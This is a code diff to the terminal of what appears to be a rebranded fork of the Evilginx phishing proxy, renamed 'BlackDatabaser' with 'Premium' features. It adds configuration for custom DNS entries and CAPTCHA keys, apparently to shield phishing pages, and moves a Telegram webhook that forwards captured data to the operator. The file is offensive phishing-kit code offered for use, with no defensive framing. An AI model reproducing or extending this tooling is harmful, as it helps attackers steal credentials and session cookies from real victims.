@@ -192,17 +192,38 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "webhook_telegram", "gophish admin_url", "gophish api_key", "gophish insecure"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.general.WebhookTelegram, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "webhook_telegram", "dnsentries", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.WebhookTelegram, t.cfg.GetDnsEntries(), t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
 		switch args[0] {
+
+
+		case "turnstile_sitekey":
+			t.cfg.SetTurnstileSitekey(args[1])
+			return nil
+		case "turnstile_privkey":
+			t.cfg.SetTurnstilePrivkey(args[1])
+			return nil
+		case "recaptcha_sitekey":
+			t.cfg.SetReCaptchaSitekey(args[1])
+			return nil
+		case "recaptcha_privkey":
+			t.cfg.SetReCaptchaPrivkey(args[1])
+			return nil
+
+
 		case "domain":
 			t.cfg.SetBaseDomain(args[1])
 			t.cfg.ResetAllSites()
 			t.manageCertificates(false)
 			return nil
+		case "webhook_telegram":
+			t.cfg.SetWebhookTelegram(args[1])
+			log.Warning("Brother now restart this amazing tool by BlackDatabaser and use it")
+			return nil
+
 		case "ipv4":
 			t.cfg.SetServerExternalIP(args[1])
 			return nil
@@ -215,10 +236,6 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetUnauthUrl(args[1])
 			return nil
-		case "webhook_telegram":
-			t.cfg.SetWebhookTelegram(args[1])
-			log.Warning("you need to restart evilginx after this change")
-			return nil	
 		case "autocert":
 			switch args[1] {
 			case "on":
@@ -236,9 +253,9 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
 				err := t.p.gophish.Test()
 				if err != nil {
-					log.Error("gophish: %s", err)
+					log.Error("BlackDatabaser: %s", err)
 				} else {
-					log.Success("gophish: connection successful")
+					log.Success("BlackDatabaser: connection was successful go and try it brother !")
 				}
 				return nil
 			}
@@ -273,6 +290,17 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 			}
 		}
+
+
+	} else if pn == 4 {
+		switch args[0] {
+		case "dnsentry":
+			t.cfg.SetDnsEntry(args[1], args[2], args[3])
+			return nil
+		}
+
+
+
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
 }
@@ -967,6 +995,13 @@ func (t *Terminal) handleLures(args []string) error {
 					}
 					do_update = true
 					log.Info("redirect_url = '%s'", l.RedirectUrl)
+
+
+
+
+
+
+
 				case "phishlet":
 					_, err := t.cfg.GetPhishlet(val)
 					if err != nil {
@@ -1163,14 +1198,14 @@ func (t *Terminal) monitorLurePause() {
 
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
-	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
+	h.AddCommand("config", "general", "manage general configuration", "Shows values of all BlackDatabaser configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
+			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")), readline.PcItem("dnsentry")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
-	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
+	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. BlackDatabaser.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
-	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "(example: 4101656209:AAFJeahG73axTthuvh4wW4gg6Wtnhe51yVw/1721242916)")
+	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "format: bot_token/chat_id (example: 9165432191:ABBJvavhVAcaqTCXAvh4wGxxxxxxxxx/-17751242916)")
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
@@ -1178,6 +1213,11 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
+	h.AddSubCommand("config", []string{"dnsentry"}, "BlackDatabaser Premium dnsentry <name> <record_type> <value>", "provide a DNS entry of type A or CNAME to be returned by the internal resolver e.g. 'www CNAME cloudfront.net.'")
+	h.AddSubCommand("config", []string{"turnstile_sitekey"}, "turnstile_sitekey", "change the site key for Cloudflare's Turnstile CAPTCHA")
+	h.AddSubCommand("config", []string{"turnstile_privkey"}, "turnstile_privkey", "change the private key for Cloudflare's Turnstile CAPTCHA")
+	h.AddSubCommand("config", []string{"recaptcha_sitekey"}, "recaptcha_sitekey", "change the site key for Google's reCAPTCHA")
+	h.AddSubCommand("config", []string{"recaptcha_privkey"}, "recaptcha_privkey", "change the private key for Google's reCAPTCHA")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
